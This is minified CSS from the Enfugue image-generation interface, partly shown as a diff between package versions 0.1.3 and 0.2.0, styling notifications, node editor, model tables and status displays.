i{flex-grow:1;font-size:18px;text-align:right}enfugue-notification-center{bottom:0;display:flex;flex-flow:column-reverse nowrap;justify-content:flex-start;left:66%;pointer-events:none;position:fixed;right:0;top:0;z-index:6}enfugue-notification{backdrop-filter:blur(10px);background-color:rgba(0,0,0,.4);border:1px solid var(--darker-color);border-radius:2px;box-shadow:2px 2px 8px rgba(0,0,0,.3);color:var(--light-color);display:flex;flex-flow:column nowrap;height:150px;margin:1em;padding:1em;pointer-events:auto;position:relative;transition:all .5s ease-in-out}enfugue-notification i{cursor:pointer;font-size:18px;opacity:.75;position:absolute;right:1em;top:11px;transition:opacity .25s ease-in-out}enfugue-notification i:hover{opacity:1}enfugue-notification p{flex-basis:100%;font-size:13px;overflow-y:auto}enfugue-notification.hiding{height:0;margin:0 1em;opacity:0;padding:0 1em}enfugue-notification.hiding,enfugue-notification.hiding p{overflow:hidden}enfugue-notification h2{border-bottom:1px solid var(--lightest-color);color:var(--lightest-color);font-size:24px;font-weight:700;margin-bottom:.5em;text-transform:uppercase}enfugue-notification:not(:last-child){margin-top:0}enfugue-notification.info h2{border-color:rgba(92,184,92,.9);color:rgba(92,184,92,.75)}enfugue-notification.warn h2{border-color:rgba(240,173,78,.9);color:rgba(240,173,78,.75)}enfugue-notification.error h2{border-color:rgba(217,83,79,.9);color:rgba(217,83,79,.75)}enfugue-color-input,enfugue-repeatable-input,enfugue-search-list{align-items:center;background-color:var(--darker-color);border:1px solid #000;border-radius:5px;display:flex;flex-flow:row wrap;gap:5px;outline:none;padding:5px;position:relative;width:100%}enfugue-color-input{flex-flow:row nowrap}enfugue-search-list>enfugue-search-list-selection{align-items:center;background-color:var(--theme-color-primary);border-left:3px solid transparent;border-radius:2px;border-right:3px solid transparent;box-sizing:border-box;color:var(--lightest-color);display:flex;flex-flow:row nowrap;font-size:12px;justify-content:center;opacity:1;padding:5px 10px 5px 5px;position:relative;transition:border-color .1s ease-in-out,opacity .25s ease-in-out}enfugue-search-list>enfugue-search-list-selection span{font-weight:700}enfugue-search-list>enfugue-search-list-selection.dragged{opacity:.5}enfugue-search-list>enfugue-search-list-selection.drop-left{border-left:3px solid var(--dark-color)}enfugue-search-list>enfugue-search-list-selection.drop-right{border-right:3px solid var(--dark-color)}enfugue-search-list>enfugue-search-list-selection>button{background-color:var(--lightest-color);border-radius:20px;border-width:0;color:var(--theme-color-primary);height:15px;line-height:0;margin-right:5px;padding:0;width:15px}enfugue-search-list>enfugue-search-list-selection>button:not(:disabled):not(.disabled):hover{background-color:var(--theme-color-primary);color:var(--lightest-color)}enfugue-color-input>input,enfugue-search-list>input{border:none;flex-grow:1;margin:0;padding:5px}enfugue-color-input>.inline-color-preview{border:1px solid #000;border-radius:5px;cursor:pointer;height:20px;width:20px}enfugue-color-input-helper-view,ul.enfugue-search-list-items{background-color:var(--darker-color);border:1px solid var(--darkest-color);border-bottom-left-radius:5px;border-bottom-right-radius:5px;border-top:none;color:var(--light-color);max-height:400px;max-height:250px;min-height:40px;overflow-y:auto;position:fixed;z-index:10}enfugue-color-input-helper-view .preview-input-container{align-items:stretch;display:flex;flex-flow:row nowrap;gap:5px;justify-content:stretch;padding:5px}enfugue-color-input-helper-view .preview-input-container .preview{align-items:center;display:flex;flex-basis:25%;flex-flow:column nowrap;font-weight:700;gap:1em;justify-content:center;text-transform:uppercase}enfugue-color-input-helper-view .preview-input-container .input-container{align-items:center;display:flex;flex-basis:100%;flex-flow:column nowrap;gap:5px;justify-content:center}enfugue-color-input-helper-view .preview-input-container .input-container .input-part,enfugue-color-input-helper-view .preview-input-container .preview{border:1px solid #ccc;border-radius:5px}enfugue-color-input-helper-view .preview-input-container .input-container .input-part{cursor:pointer;height:30px;position:relative;width:100%}enfugue-color-input-helper-view .preview-input-container .input-container .input-part .indicator{border:1px solid #ccc;bottom:-5px;left:0;margin-left:-5px;pointer-events:none;position:absolute;top:-5px;width:10px}ul.enfugue-search-list-items>li{align-items:center;background-color:var(--darker-color);cursor:pointer;display:flex;flex-flow:row nowrap;font-size:12px;justify-content:flex-start;padding:.5em;position:relative;transition:all .25s ease-in-out}ul.enfugue-search-list-items>li:hover{background-color:var(--darkest-color)}ul.enfugue-search-list-items>li:not(:last-child){border-bottom:1px solid var(--darkest-color)}ul.enfugue-multi-search-list-items>li:before{border:1px solid #ccc;border-radius:2px;color:var(--theme-color-tertiary);content:"\A";display:block;font-weight:700;height:14px;margin-right:4px;padding:0;text-align:center;vertical-align:middle;width:14px}ul.enfugue-multi-search-list-items>li.selected:before{border-color:var(--theme-color-tertiary);content:"✓"}enfugue-repeatable-input input.add-item{flex-grow:0}enfugue-repeatable-input enfugue-repeatable-input-item{display:block;position:relative;width:100%}enfugue-repeatable-input enfugue-repeatable-input-item input.remove-item{border-radius:15px;height:15px;line-height:0;margin:0;padding:0;position:absolute;right:-2px;text-align:center;top:-2px;width:15px}enfugue-repeatable-input enfugue-repeatable-input-item input.remove-item.disabled{opacity:.33}enfugue-repeatable-input.columns{align-items:stretch;flex-flow:column nowrap}enfugue-repeatable-input.columns enfugue-repeatable-input-item{margin-bottom:5px}enfugue-repeatable-input enfugue-repeatable-input-item form:after{display:none!important}enfugue-repeatable-input enfugue-repeatable-input-item form.inset-form{padding:10px}enfugue-repeatable-input enfugue-repeatable-input-item orm.inset-form fieldset:not(:last-child){margin-bottom:10px}enfugue-repeatable-input enfugue-repeatable-input-item>form.inset-form fieldset .field-container:not(:last-child){margin-bottom:5px}enfugue-repeatable-input enfugue-repeatable-input-item>form{gap:0;margin:0;padding:5px}enfugue-repeatable-input.columns input.add-item{width:calc(100% - 5px)}enfugue-repeatable-input.columns input.remove-item{background-color:#000;border-color:#000}enfugue-repeatable-input.columns input.remove-item:not(:disabled):not(.disabled):hover{color:#000}form.model-picker{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;left:40px;max-width:500px;padding:5px 0 0 5px;position:absolute;top:35px;width:calc(50vw - 175px);z-index:3}.no-animations form.model-picker:after{display:none}form.model-picker fieldset{width:100%}form.model-picker fieldset legend{display:none}form.model-picker div#tensorrt{cursor:pointer;height:22px;margin-left:-64px;position:relative;transition:all .25s ease-in-out}form.model-picker div#tensorrt img{filter:grayscale(100%);height:22px}form.model-picker div#tensorrt:hover img{filter:grayscale(75%)}form.model-picker div#tensorrt.ready img{filter:grayscale(0)}form.model-picker div#tensorrt span.fraction{border-radius:20px;color:#000;display:block;font-size:10px;height:20px;position:absolute;right:12.1px;text-align:center;top:0;width:20px}form.model-picker div#tensorrt span.fraction:after{background-color:#000;content:"\A";height:1px;left:5px;position:absolute;top:10px;transform:rotate(-62deg);width:10px}form.model-picker div#tensorrt span.fraction>span:first-child{display:block;left:3px;position:absolute;top:2px}form.model-picker div#tensorrt span.fraction>span:last-child{bottom:1px;display:block;position:absolute;right:3px}form.model-picker enfugue-search-list{margin:0}ul.model-picker-list-input-view>li>span{align-items:center;display:flex;flex-flow:row nowrap;height:100%;justify-content:space-between;width:100%}.model-configuration-form-view{left:35px;max-width:520px;opacity:.5;position:absolute;top:75px;transition:opacity .25s ease-in-out;width:calc(50vw - 165px);z-index:4}.model-configuration-form-view:hover{opacity:1}.model-configuration-form-view legend{flex-direction:row-reverse;justify-content:flex-end}.model-configuration-form-view legend:after{margin-right:10px}.page-buttons{align-items:center;display:flex;flex-flow:row nowrap;gap:5px;justify-content:stretch;margin:1em;width:calc(100% - 2em)}.page-buttons>*{flex-basis:100%;text-align:center}enfugue-status{align-items:center;color:var(--light-color);display:flex;flex-flow:row nowrap;font-size:10px;font-weight:900;gap:5px;height:100%;justify-content:space-between;margin-left:5px;padding:0 5px;text-shadow:1px 1px 0 rgba(0,0,0,.8);transition:all .25s ease-in-out}enfugue-status-version:before{content:"VERSION: ";font-weight:200}enfugue-status-uptime:before{content:"UPTIME: ";font-weight:200}enfugue-status-gpu-name:before{content:"GPU: ";font-weight:200}enfugue-status-gpu-load:before{color:var(--light-color);content:"LOAD: ";font-weight:200}enfugue-status-gpu-load:after{content:"%";font-weight:200}enfugue-status-gpu-temp:before{color:var(--light-color);content:"TEMP: ";font-weight:200}enfugue-status-gpu-temp:after{content:"°C";font-weight:200}enfugue-status-gpu-memory:before{content:"MEM: ";font-weight:200}enfugue-status-icon{background-color:var(--dark-color);border:1px solid var(--darkest-color);border-radius:14px;display:inline-block;height:14px;width:14px}enfugue-status-gpu-memory{border:1px solid var(--dark-color);border-radius:4px;display:inline-block;padding:4px}enfugue-status-icon.idle{background-color:#999;cursor:not-allowed}enfugue-status-icon.ready{background-color:#4bb543;cursor:pointer}enfugue-status-icon.error{background-color:#f33;cursor:not-allowed}enfugue-status-icon.busy{background-color:#e9d502;cursor:pointer}enfugue-downloads{display:flex;flex-flow:column-reverse nowrap;gap:1em;padding:1em}enfugue-download{display:flex;flex-flow:column nowrap;gap:2px}enfugue-download-name{color:var(--theme-color-secondary);display:block;font-family:var(--header-font);font-size:1.5em}enfugue-download-progress{border-radius:2px;display:block;height:2px;width:100%}enfugue-download-size,enfugue-download-time{display:block;font-weight:300}enfugue-download-status{background-color:rgba(0,0,0,.6);border-radius:22px;color:var(--lightest-color);cursor:pointer;display:block;height:22px;line-height:22px;margin-left:auto;margin-right:8px;position:relative;text-align:center;width:22px}enfugue-download-status i{opacity:1!important}enfugue-download-count{background-color:var(--dark-color);border-radius:12px;color:var(--light-color);font-size:10px;height:12px;line-height:12px;position:absolute;right:-2px;text-align:center;top:-2px;width:12px}enfugue-download-status.inactive{background:none!important;opacity:.5}enfugue-scribble-view{bottom:0;cursor:default;display:block;left:0;position:absolute;right:0;top:0;z-index:0}enfugue-scribble-view canvas{image-rendering:pixelated;position:relative;z-index:-1}enfugue-model-table-searching{display:block;margin:0;padding:1em 1em 0 0;text-align:right}enfugue-model-table-searching input{margin:0}enfugue-image-inspector{cursor:default;display:block;overflow:hidden;position:relative;text-align:center}enfugue-image-inspector .image-view-container{display:block;max-height:100%;overflow:hidden}enfugue-image-inspector .down,enfugue-image-inspector .left,enfugue-image-inspector .right,enfugue-image-inspector .up{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;opacity:0;pointer-events:none;position:absolute;transition:all .25s ease-in-out}enfugue-image-inspector .down.active,enfugue-image-inspector .left.active,enfugue-image-inspector .right.active,enfugue-image-inspector .up.active{font-size:40px;opacity:.5}enfugue-image-inspector .up{background-image:linear-gradient(0deg,transparent,#000);height:40px;left:0;right:0;top:0}enfugue-image-inspector .down{background-image:linear-gradient(180deg,transparent,#000);bottom:0;height:40px;left:0;position:absolute;right:0}enfugue-image-inspector .left{background-image:linear-gradient(270deg,transparent,#000);bottom:0;left:0;position:absolute;top:0;width:40px}enfugue-image-inspector .right{background-image:linear-gradient(90deg,transparent,#000);bottom:0;position:absolute;right:0;top:0;width:40px}enfugue-image-details{color:#000;font-family:var(--monospace-font),monospace;font-size:10px;position:absolute;right:5px;text-align:right;text-shadow:1px 1px 0 #fff;top:107px}enfugue-image-browser{box-shadow:0 0 10px rgba(0,0,0,.6);cursor:pointer;height:100px;opacity:.5;position:absolute;right:5px;top:5px;transition:all .25s ease-in-out}enfugue-image-browser:hover{opacity:1}enfugue-image-browser img{height:100%;pointer-events:none}enfugue-image-browser span{border:1px solid #fff;box-shadow:inset 0 0 1px #000;left:0;margin:0;max-height:100%;max-width:100%;padding:0;pointer-events:none;position:absolute;top:0}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/09-enfugue-nodes.min.css` & `enfugue-0.2.0/enfugue/static/css/09-enfugue-nodes.min.css`

 * *Files 11% similar despite different names*

```diff
@@ -1 +1 @@
-enfugue-node-editor,enfugue-nodes{display:block;flex-grow:1;height:100%;overflow:hidden;position:relative;width:100%}enfugue-node-editor{display:block}enfugue-nodes{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center}enfugue-nodes.oversize-x{justify-content:flex-start;overflow-x:auto}enfugue-node-canvas{left:0;position:absolute;top:0;transform-origin:top left}enfugue-node-editor enfugue-node-canvas{background:linear-gradient(to right,var(--dark-color) 0,transparent 1px) 0 0,linear-gradient(to right,var(--darker-color) 0,transparent 1px) 0 0,linear-gradient(to bottom,var(--dark-color) 0,transparent 1px) 0 0,linear-gradient(to bottom,var(--darker-color) 0,transparent 1px) 0 0;background-color:var(--darkest-color);background-position:-.5px -.5px;background-size:64px 64px,8px 8px,64px 64px,8px 8px}enfugue-node-editor enfugue-node-canvas>canvas{pointer-events:none}enfugue-nodes enfugue-node-canvas{position:relative}enfugue-nodes enfugue-node-canvas>canvas{display:none}enfugue-node-editor.windows>enfugue-node-canvas{background:none}enfugue-node-editor-position,enfugue-node-editor-zoom{bottom:5px;color:var(--light-color);font-weight:700;position:absolute;text-transform:uppercase;z-index:3}enfugue-node-editor-position{left:5px}enfugue-node-editor-position-reset,enfugue-node-editor-zoom-reset{background-color:hsla(0,0%,100%,.05);border:1px solid #000;border-radius:2px;cursor:pointer;font-size:12px;padding:2px 4px;transition:background-color .25s ease-in-out}enfugue-node-editor-position-reset:hover,enfugue-node-editor-zoom-reset:hover{background-color:hsla(0,0%,100%,.1)}enfugue-node-editor-position-reset{margin-left:5px}enfugue-node-editor-zoom-reset{margin-right:5px}enfugue-node-editor-zoom{right:5px}enfugue-node-editor-zoom-readout:after{content:"×"}enfugue-node-editor-zoom-in,enfugue-node-editor-zoom-out{cursor:pointer;margin-right:5px}enfugue-node{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch;padding:10px;pointer-events:all;position:absolute;transition:transform .25s ease-out;z-index:1}enfugue-node.minimized{pointer-events:none;transition:all .25s ease-in}enfugue-node.focused{z-index:2}enfugue-node-container{align-items:stretch;background-color:var(--darkest-color);border:1px solid #000;border-radius:4px;display:block;flex-flow:column nowrap;justify-content:stretch;overflow:hidden;width:100%}enfugue-node.input-output>enfugue-node-container{background-color:#153131;color:var(--lightest-color)}enfugue-node-header,enfugue-windows-toolbar-item{align-items:center;background-color:var(--darker-color);color:var(--lightest-color);display:flex;flex-flow:row nowrap;flex-grow:0;font-size:14px;justify-content:stretch;overflow:hidden;padding:0 5px;transition:background-color .2s ease-in-out,height .2s ease-in-out;z-index:10}enfugue-node.flipped enfugue-node-header{bottom:0}enfugue-windows-toolbar-item{cursor:pointer;height:30px}enfugue-node-header:hover,enfugue-windows-toolbar-item:hover{background-color:var(--dark-color)}enfugue-node-name,enfugue-windows-toolbar-item-name{flex-grow:1;font-family:var(--monospace-font),monospace;margin-right:5px}enfugue-node-button,enfugue-windows-toolbar-item-button{cursor:pointer;flex-grow:0;margin:0 3px;transition:color .25s ease-in-out;z-index:10}enfugue-node-button:hover,enfugue-windows-toolbar-item-button:hover{color:var(--theme-color-primary)}enfugue-windows-toolbar{background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.1);bottom:0;display:flex;flex-flow:row wrap;gap:1px;left:0;min-height:30px;pointer-events:all;position:absolute;right:0}enfugue-node-contents{display:block;flex-grow:1;overflow:auto;position:relative;width:100%}enfugue-node-contents h1,enfugue-node-contents h2,enfugue-node-contents h3{margin:1rem 0 0 1rem}enfugue-node-editor.image-editor enfugue-node.hide-header enfugue-node-header{background-color:rgba(0,0,0,.4);background-image:linear-gradient(180deg,rgba(0,0,0,.7),transparent);position:absolute;width:100%}enfugue-node-editor.image-editor enfugue-node.hide-header enfugue-node-header:hover{background-color:rgba(0,0,0,.6)}enfugue-node-editor.image-editor enfugue-node-container{background:transparent;border-radius:0;border-width:0;position:relative}enfugue-node-editor.image-editor enfugue-node:hover enfugue-node-container{background:hsla(0,0%,100%,.02)}enfugue-node-editor.image-editor enfugue-node-contents{overflow:hidden}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view{display:block;height:100%;position:relative;width:100%;z-index:-1}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view .background{background-position:0 0;background-repeat:no-repeat;background-size:auto}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-actual .background{background-size:auto}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-stretch .background{background-size:100% 100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-contain .background{background-size:contain}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-cover .background{background-size:cover}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-left .background{background-position:0 0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-center .background{background-position:top}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-right .background{background-position:100% 0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-left .background{background-position:0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-center .background{background-position:50%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-right .background{background-position:100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-left .background{background-position:0 100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-center .background{background-position:bottom}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-right .background{background-position:100% 100%}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.top-right{transform:rotate(90deg)}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.bottom-right{transform:rotate(180deg)}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.bottom-left{transform:rotate(270deg)}enfugue-node-editor.image-editor enfugue-node-canvas .current-invocation-image-view{left:0;position:absolute;top:0}enfugue-node-editor.image-editor.zoom-out enfugue-node-canvas .current-invocation-image-view,enfugue-node-editor.image-editor.zoom-out enfugue-node-canvas enfugue-background-image-view{image-rendering:auto}enfugue-node-editor.image-editor.zoom-in enfugue-node-canvas .current-invocation-image-view,enfugue-node-editor.image-editor.zoom-in enfugue-node-canvas enfugue-background-image-view{image-rendering:pixelated}enfugue-node-editor.image-editor enfugue-node-canvas{background:none;border:1px solid var(--dark-color);box-sizing:content-box}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-image-editor-grid{background-color:transparent;background:linear-gradient(90deg,hsla(0,0%,100%,.1) 0,hsla(0,0%,100%,.1) 1px,transparent 0) 0 0,linear-gradient(90deg,hsla(0,0%,100%,.02) 0,hsla(0,0%,100%,.02) 1px,transparent 0) 0 0,linear-gradient(180deg,hsla(0,0%,100%,.1) 0,hsla(0,0%,100%,.1) 1px,transparent 0) 0 0,linear-gradient(180deg,hsla(0,0%,100%,.02) 0,hsla(0,0%,100%,.02) 1px,transparent 0) 0 0;background-position:-.5px -.5px;background-size:64px 64px,8px 8px,64px 64px,8px 8px;height:100%;left:0;opacity:1;pointer-events:none;position:absolute;top:0;transition:.1s ease-in-out;width:100%;z-index:2}enfugue-node-editor.image-editor.has-image enfugue-node-canvas enfugue-image-editor-grid{opacity:0}enfugue-node-editor.image-editor.has-image enfugue-node-canvas:hover enfugue-image-editor-grid{opacity:1}enfugue-node-editor.image-editor.has-image enfugue-node-canvas enfugue-node{display:none}enfugue-node-editor.image-editor enfugue-invocation-loading{border:1px solid var(--dark-color);border-radius:10px;bottom:5px;display:block;height:20px;left:175px;line-height:18px;position:absolute;right:175px;transition:all .25s ease-in-out;z-index:1}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser{align-items:center;bottom:30px;display:flex;flex-flow:row nowrap;gap:5px;justify-content:center;left:175px;position:absolute;right:175px}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample{align-items:center;border:1px solid var(--dark-color);border-radius:2px;cursor:pointer;display:flex;flex-flow:row nowrap;height:100px;justify-content:center;opacity:.7;transition:all .25s ease-in-out}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample:hover{opacity:.9}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample:active{opacity:1}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample.no-sample{color:var(--dark-color);font-size:100px;width:100px}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample img{max-height:100px}enfugue-node-editor.image-editor enfugue-invocation-stop{background-color:var(--theme-color-primary);border-radius:80px;color:#fff;cursor:not-allowed;display:block;filter:grayscale(100%);font-size:11px;height:40px;line-height:40px;opacity:0;pointer-events:none;position:absolute;right:5px;text-align:center;text-transform:uppercase;top:5px;transition:all .25s ease-in-out;width:40px}enfugue-node-editor.image-editor enfugue-invocation-stop.ready{cursor:pointer;filter:grayscale(50%);opacity:1;pointer-events:all}enfugue-node-editor.image-editor enfugue-invocation-stop.ready:hover{filter:grayscale(25%)}enfugue-node-editor.image-editor enfugue-invocation-stop.ready:active{filter:grayscale(0)}enfugue-node-editor.image-editor enfugue-invocation-loading{align-items:center;display:flex;flex-flow:row nowrap;justify-content:space-between;overflow:hidden}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-loaded{display:block;height:100%;opacity:0;position:absolute;transition:all .1s linear;z-index:-1}enfugue-node-editor.image-editor enfugue-invocation-loading.loading enfugue-invocation-loaded{opacity:1}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-duration,enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-iterations,enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-remaining{bottom:0;color:#fff;display:block;font-size:10px;text-shadow:1px 1px 1px #000;top:0}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-duration{margin-left:5px}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-iterations{margin-left:5px;margin-right:5px}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-remaining{margin-right:5px}enfugue-node-editor.image-editor enfugue-node form{font-size:11px;height:0;opacity:0;overflow-y:auto;padding-bottom:1em;position:absolute;top:0;transition:all .25s ease-in-out;width:100%}enfugue-node-editor.image-editor enfugue-node.image-editor-prompt-node-view form{background-color:var(--dark-color)!important;height:100%!important;opacity:1!important;top:0!important}enfugue-node-editor.image-editor enfugue-node.image-editor-image-node-view enfugue-scribble-view{opacity:.5}enfugue-node-editor.image-editor enfugue-node.flipped form{bottom:0;top:auto}enfugue-node-editor.image-editor enfugue-node form input,enfugue-node-editor.image-editor enfugue-node form label,enfugue-node-editor.image-editor enfugue-node form select{color:#fff;font-size:11px}enfugue-node-editor.image-editor enfugue-node form legend{display:none}enfugue-node-editor.image-editor enfugue-node form .field-container{flex-basis:30%}enfugue-node-editor.image-editor enfugue-node form .field-container.checkbox-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.image-editor-image-anchor-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.image-editor-image-fit-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.text-input-view{flex-basis:40%}enfugue-node-editor.image-editor enfugue-node:hover form{background-color:rgba(0,0,0,.4);height:calc(100% - 30px);opacity:1;top:30px}enfugue-node-editor.image-editor enfugue-node.flipped:hover form{bottom:30px;top:auto}enfugue-node-editor.image-editor enfugue-node:hover form:hover{background-color:rgba(0,0,0,.6)}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar{background-color:transparent;background-image:linear-gradient(90deg,transparent,rgba(0,0,0,.4));border:none;bottom:0;left:auto;right:0;top:0}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item{background:none;border:none;opacity:.5;transition:all .25s ease-in-out}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:active,enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:hover{border:none;opacity:1}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:after{display:none}.field-container.checkpoint-input-view,.field-container.multi-inversion-input-view,.field-container.multi-lora-input-view,.field-container.upscale-diffusion-guidance-scale-input-view,.field-container.upscale-diffusion-negative-prompt-input-view,.field-container.upscale-diffusion-prompt-input-view,.field-container.upscale-diffusion-steps-input-view,.field-container.upscale-methods-input-view,fieldset.field-set-directories .field-container,fieldset.field-set-prompts .field-container{flex-basis:100%}fieldset.field-set-prompts .field-container{margin-bottom:1em}.field-container.multi-lora-input-view legend{display:none}.field-container.multi-lora-input-view form .field-container{flex-basis:100%}enfugue-model-table{display:flex;flex-flow:column nowrap;justify-content:space-between}enfugue-model-table-paging{align-items:center;display:flex;flex-flow:row nowrap;justify-content:space-between;padding:5px 1em 0}enfugue-model-table-paging>span{color:var(--theme-color-tertiary);font-size:12px}enfugue-model-table-paging ul{display:flex;flex-flow:row nowrap;gap:5px}enfugue-model-table-paging ul li{align-items:center;background-color:var(--theme-color-tertiary);border-radius:3px;color:#fff;cursor:pointer;display:flex;flex-flow:row nowrap;height:25px;justify-content:center;line-height:25px;position:relative;text-align:center;transition:background-color .25s ease-in-out;width:25px}enfugue-model-table-paging ul li.selected{background-color:var(--theme-color-secondary)}enfugue-model-table-paging ul li span{font-family:var(--monospace-font),monospace}enfugue-model-table ul.include-first li:first-child{margin-right:30px}enfugue-model-table ul.include-first li:first-child:after{color:var(--theme-color-tertiary);content:"…";font-size:16px;left:calc(100% + 11px);position:absolute}enfugue-model-table ul.include-last li:last-child{margin-left:30px}enfugue-model-table ul.include-last li:last-child:after{color:var(--theme-color-tertiary);content:"…";font-size:16px;position:absolute;right:calc(100% + 11px)}enfugue-model-table-paging ul li:before{background-color:#fff;bottom:0;content:"\A";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .25s ease-in-out}enfugue-model-table-paging ul li:hover:before{opacity:.1}enfugue-invocation-outputs{display:flex;flex-flow:row nowrap;gap:5px}enfugue-model-table.invocation-history tr td:first-child,enfugue-model-table.invocation-history tr td:nth-child(2),enfugue-model-table.invocation-history tr th:first-child,enfugue-model-table.invocation-history tr th:nth-child(2){width:15%}enfugue-model-table.invocation-history tr td:nth-child(3),enfugue-model-table.invocation-history tr th:nth-child(3){width:25%}enfugue-model-table.invocation-history tr td:nth-child(4),enfugue-model-table.invocation-history tr th:nth-child(4){width:35%}div.about-view>p,div.announcements-view>.view>p{line-height:1.1em;margin:1rem 0 0 1rem}div.announcements-view>.view>h3{color:var(--theme-color-tertiary);margin:1rem 0 0 1rem;text-align:left}div.about-view .donate-links{align-items:stretch;display:flex;flex-flow:row nowrap;gap:1em;justify-content:stretch;margin-top:1em;padding:.5em 1em}div.about-view .donate-links a{border-radius:5px;border-style:solid;border-width:2px;color:#fff;display:block;flex-basis:100%;font-weight:900;padding:1em;text-decoration:none;transition:all .25s ease-in-out}div.about-view .donate-links a:before{background-position:50%;background-repeat:no-repeat;background-size:contain;content:"\A";display:inline-block;height:25px;margin-right:10px;vertical-align:middle;width:25px}div.about-view .donate-links a.patreon{background-color:#ee614a;border-color:#ee614a}div.about-view .donate-links a.ko-fi{background-color:#29abe0;border-color:#29abe0}div.about-view .donate-links a.patreon:before{background-image:url(../img/brand/patreon.png)}div.about-view .donate-links a.ko-fi:before{background-image:url(../img/brand/ko-fi.png)}div.about-view .donate-links a:hover{background-color:transparent}div.about-view .donate-links a.patreon:hover{color:#ee614a}div.about-view .donate-links a.ko-fi:hover{color:#29abe0}div.history-view>input{float:right;margin:1em 1em 0 0}table.history-table-view tr td:first-child,table.history-table-view tr th:first-child,table.log-table-view tr td:first-child,table.log-table-view tr th:first-child{width:150px}table.log-table-view tr td:nth-child(2),table.log-table-view tr td:nth-child(3),table.log-table-view tr th:nth-child(2),table.log-table-view tr th:nth-child(3){width:80px}table.installation-directory-summary-table-view tr td:first-child,table.installation-directory-summary-table-view tr th:first-child{width:250px}input.new-model-input-view,input.new-user-input-view,input.upload-file-input-view{float:right;margin-right:1em}input.upload-file-input-view{margin-top:1em}input.download-input-view{margin:1em;width:calc(100% - 2em)}enfugue-invocation-outputs enfugue-invocation-output{cursor:pointer}enfugue-invocation-outputs enfugue-invocation-output img{max-height:50px}
+enfugue-node-editor,enfugue-nodes{display:block;flex-grow:1;height:100%;overflow:hidden;position:relative;width:100%}enfugue-node-editor{display:block}enfugue-nodes{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center}enfugue-nodes.oversize-x{justify-content:flex-start;overflow-x:auto}enfugue-node-canvas{left:0;position:absolute;top:0;transform-origin:top left}enfugue-node-editor enfugue-node-canvas{background:linear-gradient(to right,var(--dark-color) 0,transparent 1px) 0 0,linear-gradient(to right,var(--darker-color) 0,transparent 1px) 0 0,linear-gradient(to bottom,var(--dark-color) 0,transparent 1px) 0 0,linear-gradient(to bottom,var(--darker-color) 0,transparent 1px) 0 0;background-color:var(--darkest-color);background-position:-.5px -.5px;background-size:64px 64px,8px 8px,64px 64px,8px 8px}enfugue-node-editor enfugue-node-canvas>canvas{pointer-events:none}enfugue-nodes enfugue-node-canvas{position:relative}enfugue-nodes enfugue-node-canvas>canvas{display:none}enfugue-node-editor.windows>enfugue-node-canvas{background:none}enfugue-node-editor-position,enfugue-node-editor-zoom{bottom:5px;color:var(--light-color);font-weight:700;position:absolute;text-transform:uppercase;z-index:3}enfugue-node-editor-position{left:5px}enfugue-node-editor-position-reset,enfugue-node-editor-zoom-reset{background-color:hsla(0,0%,100%,.05);border:1px solid #000;border-radius:2px;cursor:pointer;font-size:12px;padding:2px 4px;transition:background-color .25s 